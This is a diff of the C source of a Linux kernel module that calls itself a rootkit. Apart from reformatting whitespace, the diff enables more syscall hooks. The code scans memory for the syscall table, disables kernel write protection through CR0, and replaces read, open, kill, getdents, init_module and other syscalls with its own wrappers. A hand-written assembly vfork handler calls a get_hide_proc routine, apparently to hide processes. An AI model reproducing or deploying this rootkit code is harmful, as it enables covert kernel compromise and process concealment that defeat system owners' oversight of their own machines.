@@ -58,16 +58,19 @@ del_lkm(const char *name) {
  */
 //#define DEBUG_READ
 
-RT_SYSCALL_DEFINE(long, read, unsigned int fd,
-        char __user *buf, size_t count) {
-    int ret;
+RT_SYSCALL_DEFINE(long,
+	read,
+	unsigned int fd,
+	char __user *buf,
+	size_t count) {
+	int ret;
 
 #ifdef DEBUG_READ
-    DLog("read:fd:[%d],count:[%d]", fd, count);
+	DLog("read:fd:[%d],count:[%d]", fd, count);
 #endif
 
-    ret = RT_SYSCALL_CALL(read, fd, buf, count);
-    return ret;
+	ret = RT_SYSCALL_CALL(read, fd, buf, count);
+	return ret;
 }
 
 /**
@@ -76,22 +79,26 @@ RT_SYSCALL_DEFINE(long, read, unsigned int fd,
  */
 //#define DEBUG_OPEN
 
-RT_SYSCALL_DEFINE(long, open, const char __user *filename,
-        int flags, int mode) {
-    int ret;
+RT_SYSCALL_DEFINE(long,
+	open,
+	const char __user *filename,
+	int flags,
+	int mode) {
+	int ret;
 
 #ifdef DEBUG_OPEN
-    char kfileName[MAX_PATH];
-    memset(kfileName, 0, MAX_PATH);
-    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
-        DLog("open:filename:[%s]flags:[%d]mode:[%d]", kfileName, flags, mode);
-    } else {
-        DLog("open:copy_from_user failure~~");
-    }
+	char kfileName[MAX_PATH];
+	memset(kfileName, 0, MAX_PATH);
+	if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
+		DLog("open:filename:[%s]flags:[%d]mode:[%d]", kfileName, flags, mode);
+	}
+	else {
+		DLog("open:copy_from_user failure~~");
+	}
 #endif       
 
-    ret = RT_SYSCALL_CALL(open, filename, flags, mode);
-    return ret;
+	ret = RT_SYSCALL_CALL(open, filename, flags, mode);
+	return ret;
 }
 
 /**
@@ -102,20 +109,21 @@ RT_SYSCALL_DEFINE(long, open, const char __user *filename,
 #define DEBUG_CHDIR
 
 RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
-    int ret;
+	int ret;
 
 #ifdef DEBUG_CHDIR
-    char kfileName[MAX_PATH];
-    memset(kfileName, 0, MAX_PATH);
-    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
-        DLog("chdir:filename:[%s]", kfileName);
-    } else {
-        DLog("chdir:copy_from_user failure~~");
-    }
+	char kfileName[MAX_PATH];
+	memset(kfileName, 0, MAX_PATH);
+	if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
+		DLog("chdir:filename:[%s]", kfileName);
+	}
+	else {
+		DLog("chdir:copy_from_user failure~~");
+	}
 #endif   
 
-    ret = RT_SYSCALL_CALL(chdir, filename);
-    return ret;
+	ret = RT_SYSCALL_CALL(chdir, filename);
+	return ret;
 }
 
 /**
@@ -131,14 +139,14 @@ RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
 #define DEBUG_KILL
 
 RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
-    long ret = 0;
+	long ret = 0;
 
 #ifdef DEBUG_KILL
-    DLog("kill:pid:[%d],sig:[%d]", pid, sig);
+	DLog("kill:pid:[%d],sig:[%d]", pid, sig);
 #endif
 
-    ret = RT_SYSCALL_CALL(kill, pid, sig);
-    return ret;
+	ret = RT_SYSCALL_CALL(kill, pid, sig);
+	return ret;
 }
 
 /**
@@ -153,12 +161,12 @@ RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
 #define DEBUG_GETSID
 
 RT_SYSCALL_DEFINE(long, getsid, pid_t pid) {
-    int ret;
+	int ret;
 #ifdef DEBUG_GETSID
-    DLog("getsid:pid:[%d]", pid);
+	DLog("getsid:pid:[%d]", pid);
 #endif    
-    ret = RT_SYSCALL_CALL(getsid, pid);
-    return ret;
+	ret = RT_SYSCALL_CALL(getsid, pid);
+	return ret;
 }
 
 /**
@@ -175,15 +183,15 @@ RT_SYSCALL_DEFINE(long, getsid, pid_t pid) {
  */
 #define DEBUG_GETPRIORITY
 RT_SYSCALL_DEFINE(long, getpriority, int which, int who) {
-    int ret;
+	int ret;
     
 #ifdef DEBUG_GETPRIORITY
-    DLog("getpriority:which:[%d],who:[%d]", which , who );
+	DLog("getpriority:which:[%d],who:[%d]", which, who);
 #endif      
     
-    ret = RT_SYSCALL_CALL(getpriority, which, who);
+	ret = RT_SYSCALL_CALL(getpriority, which, who);
 
-    return ret;
+	return ret;
 }
 
 /**
@@ -194,14 +202,14 @@ RT_SYSCALL_DEFINE(long, getpriority, int which, int who) {
  */
 #define DEBUG_SOCKETCALL
 RT_SYSCALL_DEFINE(long, socketcall, int call, unsigned long __user * args) {
-    int ret;
+	int ret;
     
 #ifdef DEBUG_SOCKETCALL
-    DLog("socketcall:call:[%d]",call );
+	DLog("socketcall:call:[%d]", call);
 #endif          
     
-    ret = RT_SYSCALL_CALL(socketcall, call, args);
-    return ret;
+	ret = RT_SYSCALL_CALL(socketcall, call, args);
+	return ret;
 }
 
 /**
@@ -210,12 +218,12 @@ RT_SYSCALL_DEFINE(long, socketcall, int call, unsigned long __user * args) {
  */
 #define DEBUG_SYSINFO
 RT_SYSCALL_DEFINE(long, sysinfo, struct sysinfo __user *info) {
-    int ret;
+	int ret;
 #ifdef DEBUG_SYSINFO
-    DLog("sysinfo");
+	DLog("sysinfo");
 #endif      
-    ret = RT_SYSCALL_CALL(sysinfo, info);
-    return ret;
+	ret = RT_SYSCALL_CALL(sysinfo, info);
+	return ret;
 }
 
 /**
@@ -223,64 +231,71 @@ RT_SYSCALL_DEFINE(long, sysinfo, struct sysinfo __user *info) {
  * 
  */
 #define DEBUG_CLONE
-RT_SYSCALL_DEFINE_JMP(long, clone, unsigned long clone_flags, unsigned long newsp,
-        void __user *parent_tid, void __user *child_tid, struct pt_regs *regs) {
-    asm("sub    $0x14,%esp");
-    asm("mov    %ebx,-0x8(%ebp)");
-    asm("mov    %esi,-0x4(%ebp)");
-    asm("nopl   0x0(%eax,%eax,1)");
-    asm("mov    %eax,%ecx");
-    asm("mov    (%eax),%eax");
-    asm("mov    0x4(%ecx),%edx");
-    asm("mov    0x8(%ecx),%ebx");
-    asm("mov    0x10(%ecx),%esi");
-    asm("test   %edx,%edx");
-    asm("jne    next");
-    asm("mov    0x3c(%ecx),%edx");
-    asm("next:");
-    asm("mov    %esi,0x8(%esp)");
-    asm("mov    %ebx,0x4(%esp)");
-    asm("movl   $0x0,(%esp)");
-    asm("push   %eax");
-    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
-    asm("movl   %eax,%esi");
-    asm("pop    %eax");
-    asm("call   *%esi");
-    asm("mov    -0x8(%ebp),%ebx");
-    asm("mov    -0x4(%ebp),%esi");
+RT_SYSCALL_DEFINE_JMP(long,
+	clone,
+	unsigned long clone_flags,
+	unsigned long newsp,
+	void __user *parent_tid,
+	void __user *child_tid,
+	struct pt_regs *regs) {
+	asm("sub    $0x14,%esp");
+	asm("mov    %ebx,-0x8(%ebp)");
+	asm("mov    %esi,-0x4(%ebp)");
+	asm("nopl   0x0(%eax,%eax,1)");
+	asm("mov    %eax,%ecx");
+	asm("mov    (%eax),%eax");
+	asm("mov    0x4(%ecx),%edx");
+	asm("mov    0x8(%ecx),%ebx");
+	asm("mov    0x10(%ecx),%esi");
+	asm("test   %edx,%edx");
+	asm("jne    next");
+	asm("mov    0x3c(%ecx),%edx");
+	asm("next:");
+	asm("mov    %esi,0x8(%esp)");
+	asm("mov    %ebx,0x4(%esp)");
+	asm("movl   $0x0,(%esp)");
+	asm("push   %eax");
+	asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
+	asm("movl   %eax,%esi");
+	asm("pop    %eax");
+	asm("call   *%esi");
+	asm("mov    -0x8(%ebp),%ebx");
+	asm("mov    -0x4(%ebp),%esi");
 
-    asm("push %eax");
-    asm("push %ebx");
-    asm("push %ecx");
-    asm("push %edx");
+	asm("push %eax");
+	asm("push %ebx");
+	asm("push %ecx");
+	asm("push %edx");
 
-    asm volatile("movl %%eax,%0" : "=m"(clone_tid) :);
+	asm volatile("movl %%eax,%0" : "=m"(clone_tid) :);
 
-    if (clone_flag == 0) {
-        clone_pid = current->pid;
-        clone_flag = 1;
-    } else {
-        if (clone_pid == current->pid) {
-            clone_flag++;
-        } else {
-            clone_flag--;
-        }
-    }
+	if (clone_flag == 0) {
+		clone_pid = current->pid;
+		clone_flag = 1;
+	}
+	else {
+		if (clone_pid == current->pid) {
+			clone_flag++;
+		}
+		else {
+			clone_flag--;
+		}
+	}
 
-    if (clone_flag < 100 || clone_pid != current->pid) {
-        clone_tid = 0;
-    }
+	if (clone_flag < 100 || clone_pid != current->pid) {
+		clone_tid = 0;
+	}
 
-    asm("pop %edx");
-    asm("pop %ecx");
-    asm("pop %ebx");
-    asm("pop %eax");
+	asm("pop %edx");
+	asm("pop %ecx");
+	asm("pop %ebx");
+	asm("pop %eax");
 
-    asm("mov    %ebp,%esp");
-    asm("pop    %ebp");
-    asm("ret    ");
+	asm("mov    %ebp,%esp");
+	asm("pop    %ebp");
+	asm("ret    ");
 
-    return 0;
+	return 0;
 }
 
 /**
@@ -289,16 +304,19 @@ RT_SYSCALL_DEFINE_JMP(long, clone, unsigned long clone_flags, unsigned long news
  * 
  */
 #define DEBUG_INIT_MODULE
-RT_SYSCALL_DEFINE(long, init_module, void __user *umod, unsigned long len,
-        const char __user *uargs) {
-    int ret;
+RT_SYSCALL_DEFINE(long,
+	init_module,
+	void __user *umod,
+	unsigned long len,
+	const char __user *uargs) {
+	int ret;
     
 #ifdef DEBUG_INIT_MODULE
-    DLog("init_module:len:[%ld]", len );
+	DLog("init_module:len:[%ld]", len);
 #endif        
     
-    ret = RT_SYSCALL_CALL(init_module, umod, len, uargs);
-    return ret;
+	ret = RT_SYSCALL_CALL(init_module, umod, len, uargs);
+	return ret;
 }
 
 /**
@@ -308,12 +326,12 @@ RT_SYSCALL_DEFINE(long, init_module, void __user *umod, unsigned long len,
  */
 #define DEBUG_GETPGID
 RT_SYSCALL_DEFINE(long, getpgid, pid_t pid) {
-    long ret;
+	long ret;
 #ifdef DEBUG_GETPGID
-    DLog("getpgid:pdid:[%d]", pid );
+	DLog("getpgid:pdid:[%d]", pid);
 #endif          
-    ret = RT_SYSCALL_CALL(getpgid, pid);
-    return ret;
+	ret = RT_SYSCALL_CALL(getpgid, pid);
+	return ret;
 }
 
 /**
@@ -324,14 +342,17 @@ RT_SYSCALL_DEFINE(long, getpgid, pid_t pid) {
  * getdents, getdents64 - get directory entries
  */
 #define DEBUG_GETDENTS
-RT_SYSCALL_DEFINE(long, getdents, unsigned int fd,
-        struct linux_dirent __user* dirp, unsigned int count) {
-    int ret;
+RT_SYSCALL_DEFINE(long,
+	getdents,
+	unsigned int fd,
+	struct linux_dirent __user* dirp,
+	unsigned int count) {
+	int ret;
 #ifdef DEBUG_GETDENTS
-    DLog("getdents:fd:[%d],count:[%d]", fd ,count);
+	DLog("getdents:fd:[%d],count:[%d]", fd, count);
 #endif        
-    ret = RT_SYSCALL_CALL(getdents, fd, dirp, count);
-    return ret;
+	ret = RT_SYSCALL_CALL(getdents, fd, dirp, count);
+	return ret;
 }
 
 /**
@@ -340,14 +361,16 @@ RT_SYSCALL_DEFINE(long, getdents, unsigned int fd,
  * 
  */
 #define DEBUG_SCHED_GETPARAM
-RT_SYSCALL_DEFINE(long, sched_getparam, pid_t pid,
-        struct sched_param __user *param) {
-    int ret;
+RT_SYSCALL_DEFINE(long,
+	sched_getparam,
+	pid_t pid,
+	struct sched_param __user *param) {
+	int ret;
 #ifdef DEBUG_SCHED_GETPARAM
-    DLog("sched_getparam:pid:[%d]", pid);
+	DLog("sched_getparam:pid:[%d]", pid);
 #endif       
-    ret = RT_SYSCALL_CALL(sched_getparam, pid, param);
-    return ret;
+	ret = RT_SYSCALL_CALL(sched_getparam, pid, param);
+	return ret;
 }
 
 /**
@@ -356,26 +379,28 @@ RT_SYSCALL_DEFINE(long, sched_getparam, pid_t pid,
  */
 #define DEBUG_SCHED_GETSCHEDULER
 RT_SYSCALL_DEFINE(long, sched_getscheduler, pid_t pid) {
-    int ret;
+	int ret;
 #ifdef DEBUG_SCHED_GETSCHEDULER
-    DLog("sched_getscheduler:pid:[%d]", pid);
+	DLog("sched_getscheduler:pid:[%d]", pid);
 #endif        
-    ret = RT_SYSCALL_CALL(sched_getscheduler, pid);
-    return ret;
+	ret = RT_SYSCALL_CALL(sched_getscheduler, pid);
+	return ret;
 }
 
 /**
  * sched_rr_get_interval - 161 - kernel/sched/core.c
  */
 #define DEBUG_SCHED_RR_GET_INTERVAL
-RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
-        struct timespec __user *interval) {
-    long ret;
- #ifdef DEBUG_SCHED_RR_GET_INTERVAL
-    DLog("sched_rr_get_interval:pid:[%d]", pid);
+RT_SYSCALL_DEFINE(long,
+	sched_rr_get_interval,
+	pid_t pid,
+	struct timespec __user *interval) {
+	long ret;
+#ifdef DEBUG_SCHED_RR_GET_INTERVAL
+	DLog("sched_rr_get_interval:pid:[%d]", pid);
 #endif      
-    ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
-    return ret;
+	ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
+	return ret;
 }
 
 /**
@@ -384,59 +409,61 @@ RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
  */
 #define DEBUG_VFORK
 RT_SYSCALL_DEFINE_JMP(long, vfork, struct pt_regs *regs) {
-    asm("sub    $0xc,%esp");
-    asm("nopl   0x0(%eax,%eax,1)");
-    asm("mov    0x3c(%eax),%edx");
-    asm("mov    %eax,%ecx");
-    asm("mov    $0x4111,%eax");
-    asm("movl   $0x0,0x8(%esp)");
-    asm("movl   $0x0,0x4(%esp)");
-    asm("movl   $0x0,(%esp)");
-    asm("push   %eax");
-    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
-    asm("movl   %eax,%esi");
-    asm("pop    %eax");
-    asm("call   *%esi");
+	asm("sub    $0xc,%esp");
+	asm("nopl   0x0(%eax,%eax,1)");
+	asm("mov    0x3c(%eax),%edx");
+	asm("mov    %eax,%ecx");
+	asm("mov    $0x4111,%eax");
+	asm("movl   $0x0,0x8(%esp)");
+	asm("movl   $0x0,0x4(%esp)");
+	asm("movl   $0x0,(%esp)");
+	asm("push   %eax");
+	asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
+	asm("movl   %eax,%esi");
+	asm("pop    %eax");
+	asm("call   *%esi");
 
-    asm("push %eax");
-    asm("push %ebx");
-    asm("push %ecx");
-    asm("push %edx");
+	asm("push %eax");
+	asm("push %ebx");
+	asm("push %ecx");
+	asm("push %edx");
 
-    asm volatile("movl %%eax,%0" : "=m"(vfork_spid) :);
+	asm volatile("movl %%eax,%0" : "=m"(vfork_spid) :);
 
-    if (vfork_flag == 0) {
-        vfork_pid = current->pid;
-        vfork_flag = 1;
-    } else {
-        if (vfork_pid == current->pid) {
-            vfork_flag++;
-        } else {
-            vfork_flag--;
-        }
-    }
+	if (vfork_flag == 0) {
+		vfork_pid = current->pid;
+		vfork_flag = 1;
+	}
+	else {
+		if (vfork_pid == current->pid) {
+			vfork_flag++;
+		}
+		else {
+			vfork_flag--;
+		}
+	}
 
-    if (vfork_flag >= 100 && vfork_pid == current->pid) {
-        int pid;
+	if (vfork_flag >= 100 && vfork_pid == current->pid) {
+		int pid;
 
-        pid = get_hide_proc(vfork_lastpid++);
+		pid = get_hide_proc(vfork_lastpid++);
 
-        if (pid) {
-            vfork_spid = pid;
-        }
-    }
+		if (pid) {
+			vfork_spid = pid;
+		}
+	}
 
-    asm("pop %edx");
-    asm("pop %ecx");
-    asm("pop %ebx");
-    asm("pop %eax");
+	asm("pop %edx");
+	asm("pop %ecx");
+	asm("pop %ebx");
+	asm("pop %eax");
 
-    asm volatile("movl %0,%%eax"::"m"(vfork_spid));
+	asm volatile("movl %0,%%eax"::"m"(vfork_spid));
 
-    asm("leave  ");
-    asm("ret    ");
+	asm("leave  ");
+	asm("ret    ");
 
-    return 0;
+	return 0;
 }
 
 
@@ -445,20 +472,24 @@ RT_SYSCALL_DEFINE_JMP(long, vfork, struct pt_regs *regs) {
 /**
  * stat64 - 195
  */
-RT_SYSCALL_DEFINE(long, stat64, char __user *filename,
-        struct stat64 __user *statbuf) {
-    int ret;
-    ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
-    return ret;
+RT_SYSCALL_DEFINE(long,
+	stat64,
+	char __user *filename,
+	struct stat64 __user *statbuf) {
+	int ret;
+	ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
+	return ret;
 }
 /**
  * lstat64 - 196
  */
-RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
-        struct stat64 __user *statbuf) {
-    long ret;
-    ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
-    return ret;
+RT_SYSCALL_DEFINE(long,
+	lstat64,
+	char __user *filename,
+	struct stat64 __user *statbuf) {
+	long ret;
+	ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
+	return ret;
 }
 #endif
 
@@ -484,21 +515,27 @@ RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
  */
 // sys_getdents64
 
-RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
-        struct linux_dirent64 __user* dirp, unsigned int count) {
-    int ret;
-    ret = RT_SYSCALL_CALL(getdents64, fd, dirp, count);
-    return ret;
+RT_SYSCALL_DEFINE(long,
+	getdents64,
+	unsigned int fd,
+	struct linux_dirent64 __user* dirp,
+	unsigned int count) {
+	int ret;
+	ret = RT_SYSCALL_CALL(getdents64, fd, dirp, count);
+	return ret;
 }
 
 
 
 
-RT_SYSCALL_DEFINE(long, sched_getaffinity, pid_t pid, unsigned int len,
-        unsigned long __user *user_mask_ptr) {
-    int ret;
-    ret = RT_SYSCALL_CALL(sched_getaffinity, pid, len, user_mask_ptr);
-    return ret;
+RT_SYSCALL_DEFINE(long,
+	sched_getaffinity,
+	pid_t pid,
+	unsigned int len,
+	unsigned long __user *user_mask_ptr) {
+	int ret;
+	ret = RT_SYSCALL_CALL(sched_getaffinity, pid, len, user_mask_ptr);
+	return ret;
 }
 
 
@@ -509,9 +546,9 @@ RT_SYSCALL_DEFINE(long, sched_getaffinity, pid_t pid, unsigned int len,
 #if BITS_PER_LONG == 32
 
 RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf) {
-    int ret;
-    ret = RT_SYSCALL_CALL(fstat64, fd, statbuf);
-    return ret;
+	int ret;
+	ret = RT_SYSCALL_CALL(fstat64, fd, statbuf);
+	return ret;
 }
 
 
@@ -521,126 +558,127 @@ RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf
 
 
 RT_SYSCALL_DEFINE(long, gettid, void) {
-    int ret;
-    ret = RT_SYSCALL_CALL(gettid);
-    return ret;
+	int ret;
+	ret = RT_SYSCALL_CALL(gettid);
+	return ret;
 }
 
 
 
 RT_SYSCALL_DEFINE(int, waitpid, pid_t pid, int __user *stat_addr, int options) {
-    int ret;
+	int ret;
 
-    ret = RT_SYSCALL_CALL(waitpid, pid, stat_addr, options);
+	ret = RT_SYSCALL_CALL(waitpid, pid, stat_addr, options);
 
-    return ret;
+	return ret;
 }
 
 static unsigned long **find_sys_call_table(void) {
-    unsigned long vaddr_number;
+	unsigned long vaddr_number;
 
-    unsigned long **p;
+	unsigned long **p;
 
-    for (vaddr_number = (unsigned long) sys_close;
-            vaddr_number < (unsigned long) &loops_per_jiffy;
-            vaddr_number += sizeof (void *)) {
-        p = (unsigned long **) vaddr_number;
-        if (p[__NR_close] == (unsigned long *) sys_close)
-            return p;
-    }
+	for (vaddr_number = (unsigned long) sys_close;
+	        vaddr_number < (unsigned long) &loops_per_jiffy;
+	        vaddr_number += sizeof(void *)) {
+		p = (unsigned long **) vaddr_number;
+		if (p[__NR_close] == (unsigned long *) sys_close)
+			return p;
+	}
 
-    return NULL;
+	return NULL;
 }
 
 void disable_write_protection(void) {
-    unsigned long cr0 = read_cr0();
-    DLog("disable_write_protection");
-    clear_bit(16, &cr0);
-    write_cr0(cr0);
+	unsigned long cr0 = read_cr0();
+	DLog("disable_write_protection");
+	clear_bit(16, &cr0);
+	write_cr0(cr0);
 }
 
 void enable_write_protection(void) {
-    unsigned long cr0 = read_cr0();
-    set_bit(16, &cr0);
-    write_cr0(cr0);
-    DLog("enable_write_protection");
+	unsigned long cr0 = read_cr0();
+	set_bit(16, &cr0);
+	write_cr0(cr0);
+	DLog("enable_write_protection");
 }
 
 static int __init
 ThisInit(void) {
-    DLog("rootkit init");
+	DLog("rootkit init");
 
-    sys_call_table = find_sys_call_table();
-    if (NULL != sys_call_table) {
-        DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
-    } else {
-        DLog("get sys_call_table failure!");
-        return -1;
-    }
-    // local_irq_save(irq_flags);
-    disable_write_protection();
-    RT_SYSCALL_REPLACE(read); //3
-    RT_SYSCALL_REPLACE(open); //5    
-    RT_SYSCALL_REPLACE(chdir); //12
-    RT_SYSCALL_REPLACE(kill); //37
-    RT_SYSCALL_REPLACE(getsid); //66
-    RT_SYSCALL_REPLACE(getpriority); //96
-    RT_SYSCALL_REPLACE(socketcall); //102
-    RT_SYSCALL_REPLACE(sysinfo); //116
-    //RT_SYSCALL_REPLACE_JMP(clone); //120
-    RT_SYSCALL_REPLACE(init_module); //128
-    RT_SYSCALL_REPLACE(getpgid); //132
-    RT_SYSCALL_REPLACE(getdents); //141
-    RT_SYSCALL_REPLACE(sched_getparam); //155
-    RT_SYSCALL_REPLACE(sched_getscheduler); //157
-    RT_SYSCALL_REPLACE(sched_rr_get_interval); //161
-    //RT_SYSCALL_REPLACE_JMP(vfork); //190
+	sys_call_table = find_sys_call_table();
+	if (NULL != sys_call_table) {
+		DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
+	}
+	else {
+		DLog("get sys_call_table failure!");
+		return -1;
+	}
+//	local_irq_save(irq_flags);
+	disable_write_protection();
+	RT_SYSCALL_REPLACE(read);  //3
+	RT_SYSCALL_REPLACE(open);  //5    
+	RT_SYSCALL_REPLACE(chdir);  //12
+	RT_SYSCALL_REPLACE(kill);  //37
+	RT_SYSCALL_REPLACE(getsid);  //66
+	RT_SYSCALL_REPLACE(getpriority);  //96
+	RT_SYSCALL_REPLACE(socketcall);  //102
+	RT_SYSCALL_REPLACE(sysinfo);  //116
+	//RT_SYSCALL_REPLACE_JMP(clone); //120
+	RT_SYSCALL_REPLACE(init_module);  //128
+	RT_SYSCALL_REPLACE(getpgid);  //132
+	RT_SYSCALL_REPLACE(getdents);  //141
+	RT_SYSCALL_REPLACE(sched_getparam);  //155
+	RT_SYSCALL_REPLACE(sched_getscheduler);  //157
+	RT_SYSCALL_REPLACE(sched_rr_get_interval);  //161
+	//RT_SYSCALL_REPLACE_JMP(vfork); //190
 #if BITS_PER_LONG == 32
-    RT_SYSCALL_REPLACE(stat64); //195
-    RT_SYSCALL_REPLACE(lstat64); //196
+	RT_SYSCALL_REPLACE(stat64);  //195
+	RT_SYSCALL_REPLACE(lstat64);  //196
 #endif
-    //    RT_SYSCALL_REPLACE(getdents64); //220
-    //    RT_SYSCALL_REPLACE(gettid); //224
-    //    RT_SYSCALL_REPLACE(sched_getaffinity); //242  
-    enable_write_protection();
-    //  local_irq_restore(irq_flags);
-    return 0;
+	RT_SYSCALL_REPLACE(getdents64); //220
+	RT_SYSCALL_REPLACE(gettid); //224
+	RT_SYSCALL_REPLACE(sched_getaffinity); //242  
+	enable_write_protection();
+	//local_irq_restore(irq_flags);
+	return 0;
 }
 
 static void __exit
 ThisExit(void) {
-    //local_irq_save(irq_flags);
-    disable_write_protection();
-    RT_SYSCALL_RESTORE(read); //3
-    RT_SYSCALL_RESTORE(open); //5   
-    RT_SYSCALL_RESTORE(chdir); //12
-    RT_SYSCALL_RESTORE(kill); //37
-    RT_SYSCALL_RESTORE(getsid); //66
-    RT_SYSCALL_RESTORE(getpriority); //96
-    RT_SYSCALL_RESTORE(socketcall); //102
-    RT_SYSCALL_RESTORE(sysinfo); //116
-    //RT_SYSCALL_RESTORE_JMP(clone); //120
-    RT_SYSCALL_RESTORE(init_module); //128
-    RT_SYSCALL_RESTORE(getpgid); //132
-    RT_SYSCALL_RESTORE(getdents); //141
-    RT_SYSCALL_RESTORE(sched_getparam); //155
-    RT_SYSCALL_RESTORE(sched_getscheduler); //157
-    RT_SYSCALL_RESTORE(sched_rr_get_interval); //161
-    //RT_SYSCALL_RESTORE_JMP(vfork); //190   
+	//local_irq_save(irq_flags);
+	disable_write_protection();
+	RT_SYSCALL_RESTORE(read);  //3
+	RT_SYSCALL_RESTORE(open);  //5   
+	RT_SYSCALL_RESTORE(chdir);  //12
+	RT_SYSCALL_RESTORE(kill);  //37
+	RT_SYSCALL_RESTORE(getsid);  //66
+	RT_SYSCALL_RESTORE(getpriority);  //96
+	RT_SYSCALL_RESTORE(socketcall);  //102
+	RT_SYSCALL_RESTORE(sysinfo);  //116
+	//RT_SYSCALL_RESTORE_JMP(clone); //120
+	RT_SYSCALL_RESTORE(init_module);  //128
+	RT_SYSCALL_RESTORE(getpgid);  //132
+	RT_SYSCALL_RESTORE(getdents);  //141
+	RT_SYSCALL_RESTORE(sched_getparam);  //155
+	RT_SYSCALL_RESTORE(sched_getscheduler);  //157
+	RT_SYSCALL_RESTORE(sched_rr_get_interval);  //161
+	//RT_SYSCALL_RESTORE_JMP(vfork); //190   
 #if BITS_PER_LONG == 32
-    RT_SYSCALL_RESTORE(stat64); //195
-    RT_SYSCALL_RESTORE(lstat64); //196
+	RT_SYSCALL_RESTORE(stat64);  //195
+	RT_SYSCALL_RESTORE(lstat64);  //196
 #endif
-    //    RT_SYSCALL_RESTORE(getdents64); //220
-    //    RT_SYSCALL_RESTORE(gettid); //224
-    //    RT_SYSCALL_RESTORE(sched_getaffinity); //242    
-    enable_write_protection();
-    //  local_irq_restore(irq_flags);
-    DLog("rootkit exit");
+	RT_SYSCALL_RESTORE(getdents64); //220
+	RT_SYSCALL_RESTORE(gettid); //224
+	RT_SYSCALL_RESTORE(sched_getaffinity); //242    
+	enable_write_protection();
+	//local_irq_restore(irq_flags);
+	DLog("rootkit exit");
 }
 
-module_init(ThisInit); //模块入口函数
-module_exit(ThisExit); //模块出口函数
+module_init(ThisInit);  //模块入口函数
+module_exit(ThisExit);  //模块出口函数
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("youyifeng");
 MODULE_DESCRIPTION("This module can hook the sys_* function.");
